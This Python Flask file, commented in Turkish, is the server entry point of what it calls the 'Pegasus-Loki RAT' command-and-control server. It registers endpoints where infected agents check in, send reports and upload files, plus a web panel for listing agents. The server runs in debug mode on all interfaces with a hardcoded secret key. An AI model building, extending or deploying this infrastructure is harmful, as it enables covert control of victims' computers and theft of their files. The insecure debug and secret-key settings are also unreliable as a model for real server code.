from flask import Flask
import os

# Veritabanı modellerini Pegasus-orjinal'den import et
try:
    import sys
    sys.path.append('Pegasus-orjinal/server')
    from models import db
    MODELS_AVAILABLE = True
except ImportError:
    MODELS_AVAILABLE = False
    print("Veritabanı modelleri yüklenemedi")
    db = None

# Orijinal Loki modülleri (Pegasus-orjinal'den)
try:
    import sys
    sys.path.append('Pegasus-orjinal/server')
    from webui import webui
    WEBUI_AVAILABLE = True
except ImportError:
    WEBUI_AVAILABLE = False
    print("WebUI modülü yüklenemedi")

# Pegasus API modülü
try:
    from server.pegasus_api import pegasus_api, init_pegasus_api
    PEGASUS_API_AVAILABLE = True
except ImportError:
    PEGASUS_API_AVAILABLE = False
    print("Pegasus API modülü yüklenemedi")

# Orijinal API (Pegasus-orjinal klasöründen)
try:
    from api import api as original_api
    ORIGINAL_API_AVAILABLE = True
except ImportError:
    ORIGINAL_API_AVAILABLE = False
    print("Orijinal API modülü yüklenemedi")

app = Flask(__name__)
app.secret_key = 'pegasus-loki-secret-key-2025'  # Güvenli secret key

# Database configuration
import os
db_path = os.path.join(os.getcwd(), 'instance', 'loki.db')
app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{db_path}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = 'server/webui/static/uploads'

# Initialize database
db.init_app(app)

# Create upload directory if it doesn't exist
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Create database tables
with app.app_context():
    db.create_all()

# Register blueprints
print("Pegasus-Loki RAT Sunucusu başlatılıyor...")

# Ana API (Pegasus uyumlu)
if PEGASUS_API_AVAILABLE:
    app.register_blueprint(pegasus_api, url_prefix='/api')
    init_pegasus_api(app)
    print("✓ Pegasus API kaydedildi")
elif ORIGINAL_API_AVAILABLE:
    app.register_blueprint(original_api, url_prefix='/api')
    print("✓ Orijinal API kaydedildi")
else:
    print("✗ Hiçbir API modülü yüklenemedi!")

# Web arayüzü
if WEBUI_AVAILABLE:
    app.register_blueprint(webui, url_prefix='/')
    print("✓ Web arayüzü kaydedildi")
else:
    print("✗ Web arayüzü yüklenemedi")

# Ek Pegasus endpoint'leri (/pegasus prefix'i zaten /api altında kayıtlı)
if PEGASUS_API_AVAILABLE:
    print("✓ Pegasus özel endpoint'leri /api altında mevcut")

@app.route('/')
def index():
    """Ana sayfa"""
    if WEBUI_AVAILABLE:
        from flask import redirect, url_for
        return redirect(url_for('webui.agent_list'))
    else:
        return """
        <h1>Pegasus-Loki RAT Sunucusu</h1>
        <p>Sunucu çalışıyor ancak web arayüzü mevcut değil.</p>
        <p>API Endpoints:</p>
        <ul>
            <li>/api/<agent_id>/hello - Agent hello</li>
            <li>/api/<agent_id>/report - Agent rapor</li>
            <li>/api/<agent_id>/upload - Dosya yükleme</li>
            <li>/pegasus/test - API test</li>
            <li>/pegasus/system/info - Sistem bilgisi</li>
        </ul>
        """

@app.after_request
def after_request(response):
    """Response headers"""
    response.headers["Server"] = "Pegasus-Loki/2.0"
    return response

if __name__ == '__main__':
    print("\n" + "="*50)
    print("🚀 PEGASUS-LOKI RAT SUNUCUSU")
    print("="*50)
    print(f"📊 Veritabanı: {app.config['SQLALCHEMY_DATABASE_URI']}")
    print(f"📁 Upload klasörü: {app.config['UPLOAD_FOLDER']}")
    print(f"🌐 Web arayüzü: {'✓ Aktif' if WEBUI_AVAILABLE else '✗ Devre dışı'}")
    print(f"🔒 Pegasus API: {'✓ Aktif' if PEGASUS_API_AVAILABLE else '✗ Devre dışı'}")
    print("="*50)
    print("🎯 Sunucu başlatılıyor: http://0.0.0.0:5000")
    print("="*50)
    
    app.run(debug=True, host='0.0.0.0', port=5000, threaded=True)
